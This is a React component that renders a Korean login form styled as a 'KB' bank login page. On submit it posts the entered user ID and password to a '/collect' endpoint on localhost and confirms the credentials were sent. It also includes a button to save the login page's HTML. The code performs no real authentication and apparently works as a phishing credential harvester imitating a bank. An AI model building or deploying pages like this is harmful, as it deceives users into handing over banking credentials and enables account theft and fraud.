import React, { useState } from 'react';
// import React from 'react';
import '../styles/base.css';
import '../styles/L000347.css';
import '../styles/common.css';
import '../styles/design_pattern.css';
import '../styles/login.css';
import '../styles/content'

const NomppiKBLoginPage = () => {
  const [userid, setUserid] = useState('');
  const [password, setPassword] = useState('');

  const handleLogin = async () => {
    try {
      const response = await fetch('http://localhost:5000/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ userid, password }),
      });

      if (!response.ok) throw new Error('서버 응답 오류');

      alert('로그인 정보가 전송됐습니다');
    } catch (err) {
      alert('전송 실패: ' + err.message);
    }
  };

  const handleSaveHtml = async () => {
    try {
      const response = await fetch('http://localhost:5000/api/save-login-html');
      const result = await response.text();
      alert(result);
    } catch (err) {
      alert('HTML 저장 실패: ' + err.message);
    }
  };

  return (
    <div style={{ padding: '2rem', maxWidth: '400px', margin: 'auto' }}>
      <h2>KB 로그인</h2>

      <div style={{ marginBottom: '1rem' }}>
        <label htmlFor="userid">아이디</label><br />
        <input
          id="userid"
          type="text"
          value={userid}
          onChange={(e) => setUserid(e.target.value)}
          style={{ width: '100%', padding: '0.5rem' }}
        />
      </div>

      <div style={{ marginBottom: '1rem' }}>
        <label htmlFor="password">비밀번호</label><br />
        <input
          id="password"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          style={{ width: '100%', padding: '0.5rem' }}
        />
      </div>

      <div className="btn_area" style={{ marginBottom: '1rem' }}>
        <button
          type="button"
          className="btn"
          onClick={handleLogin}
          style={{ padding: '0.5rem 1rem' }}
        >
          로그인
        </button>
      </div>

      <button onClick={handleSaveHtml}>로그인 페이지 HTML 저장</button>
    </div>
  );
};

export default NomppiKBLoginPage;
